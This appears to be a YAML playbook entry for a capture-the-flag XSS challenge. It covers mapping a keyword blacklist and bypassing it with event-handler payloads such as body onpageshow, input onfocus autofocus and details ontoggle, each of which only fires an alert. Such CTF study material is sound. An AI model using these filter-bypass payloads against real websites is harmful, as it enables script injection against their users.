name: xss_blacklist_bypass
category: web
tags: [xss, injection, blacklist_bypass, event_handler]
indicators:
  - "Input field injection point"
  - "Blacklist filtering certain keywords"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Test basic XSS payload"
    when: "First access, find input field"
    how: "Try common XSS payload to identify filtering"
    payload: |
      <script>alert('XSS')</script>
      # Blocked - script tag is filtered

  - name: "Step 2: Identify blacklist keywords"
    when: "Basic payload blocked"
    how: "Test individual keywords to map the blacklist"
    payload: |
      # Blacklisted: script, onload, onmouseover, onclick, onbegin, onerror, svg, single quote
      # Test each keyword separately to confirm

  - name: "Step 3: Bypass single quote filter"
    when: "Single quote is filtered"
    how: "Use double quotes instead"
    payload: |
      alert("XSS")  # instead of alert('XSS')

  - name: "Step 4: Find unfiltered event handler"
    when: "Common event handlers filtered"
    how: "Try alternative events: onpageshow, onfocus, ontoggle"
    payload: |
      <body onpageshow=alert("XSS")>
      # onpageshow is not in the blacklist

  - name: "Step 5: Submit final payload"
    when: "Found working bypass"
    how: "Use body tag with onpageshow event"
    payload: |
      <body onpageshow=alert("XSS")>
      # Triggers alert and captures flag

  - name: "Alternative payloads"
    when: "onpageshow also filtered"
    how: "Try other unfiltered events"
    payload: |
      <input onfocus=alert("XSS") autofocus>
      <details ontoggle=alert("XSS") open>
      <marquee onstart=alert("XSS")>
